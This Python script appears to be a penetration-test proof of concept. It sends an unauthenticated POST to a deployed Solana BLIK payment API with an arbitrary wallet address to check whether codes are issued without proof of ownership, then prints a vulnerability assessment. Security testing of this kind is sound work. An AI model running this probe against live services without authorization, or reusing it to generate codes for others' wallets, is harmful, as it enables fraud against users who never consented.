#!/usr/bin/env python3
"""
Security Test: AUTHZ-VULN-01
Tests if POST /api/codes/generate accepts arbitrary wallet addresses without signature verification.
"""

import requests
import json

def test_authz_vuln_01():
    """
    Test if we can generate BLIK codes for arbitrary wallet addresses without owning them.
    This tests authorization bypass vulnerability.
    """

    print("=" * 70)
    print("SECURITY TEST: AUTHZ-VULN-01")
    print("Testing: Authorization Bypass in Code Generation")
    print("=" * 70)
    print()

    # Test configuration
    target_url = "https://solana-blik.vercel.app/api/codes/generate"
    test_wallet = "11111111111111111111111111111111"  # Arbitrary wallet address

    print(f"Target URL: {target_url}")
    print(f"Test Wallet: {test_wallet}")
    print(f"Method: POST")
    print()

    # Prepare request
    headers = {
        "Content-Type": "application/json"
    }

    payload = {
        "walletPubkey": test_wallet
    }

    print("Request Headers:")
    print(json.dumps(headers, indent=2))
    print()
    print("Request Body:")
    print(json.dumps(payload, indent=2))
    print()
    print("-" * 70)
    print("SENDING REQUEST...")
    print("-" * 70)
    print()

    try:
        # Make the POST request
        response = requests.post(
            target_url,
            headers=headers,
            json=payload,
            timeout=10
        )

        # Print response details
        print(f"Status Code: {response.status_code}")
        print()
        print("Response Headers:")
        for key, value in response.headers.items():
            print(f"  {key}: {value}")
        print()
        print("Response Body:")
        try:
            response_json = response.json()
            print(json.dumps(response_json, indent=2))
            print()
        except json.JSONDecodeError:
            print(response.text)
            print()

        print("-" * 70)
        print("VULNERABILITY ASSESSMENT")
        print("-" * 70)
        print()

        # Analyze the response
        if response.status_code == 200:
            try:
                response_data = response.json()

                # Check if we got a code back
                if "code" in response_data and "expiresIn" in response_data:
                    code = response_data.get("code", "")
                    expires_in = response_data.get("expiresIn", 0)

                    # Verify it's a 6-digit code
                    if isinstance(code, str) and len(code) == 6 and code.isdigit():
                        print("🚨 VULNERABILITY CONFIRMED: AUTHZ-VULN-01")
                        print()
                        print("Finding:")
                        print("  The API generated a BLIK code for an arbitrary wallet address")
                        print("  without requiring signature verification or proof of ownership.")
                        print()
                        print("Evidence:")
                        print(f"  - Generated Code: {code}")
                        print(f"  - Expires In: {expires_in} seconds")
                        print(f"  - Wallet Address: {test_wallet}")
                        print()
                        print("Impact:")
                        print("  An attacker can generate BLIK codes for ANY wallet address,")
                        print("  potentially linking victims' wallets to attacker-controlled")
                        print("  phone numbers without their knowledge or consent.")
                        print()
                        print("Severity: CRITICAL")
                        return True
                    else:
                        print("⚠️  Unexpected Response Format")
                        print(f"  Received code: {code}")
                        print("  Expected: 6-digit numeric code")
                else:
                    print("⚠️  Unexpected Response Structure")
                    print(f"  Missing expected fields: 'code' and/or 'expiresIn'")
                    print(f"  Received: {list(response_data.keys())}")
            except json.JSONDecodeError:
                print("⚠️  Response is not valid JSON")
                print(f"  Response text: {response.text}")

        elif response.status_code == 400:
            print("✅ VULNERABILITY NOT PRESENT (Expected Behavior)")
            print()
            print("The API rejected the request with a 400 Bad Request status.")
            print("This suggests proper input validation or authorization checks.")
            try:
                error_data = response.json()
                print(f"Error message: {error_data}")
            except:
                pass

        elif response.status_code == 401 or response.status_code == 403:
            print("✅ VULNERABILITY NOT PRESENT (Expected Behavior)")
            print()
            print(f"The API rejected the request with a {response.status_code} status.")
            print("This indicates proper authorization checks are in place.")
            try:
                error_data = response.json()
                print(f"Error message: {error_data}")
            except:
                pass

        else:
            print(f"⚠️  Unexpected Status Code: {response.status_code}")
            print("Further investigation required.")

        print()
        return False

    except requests.exceptions.RequestException as e:
        print(f"❌ ERROR: Request failed")
        print(f"Exception: {type(e).__name__}")
        print(f"Details: {str(e)}")
        print()
        return False

    except Exception as e:
        print(f"❌ ERROR: Unexpected exception")
        print(f"Exception: {type(e).__name__}")
        print(f"Details: {str(e)}")
        print()
        return False

if __name__ == "__main__":
    test_authz_vuln_01()
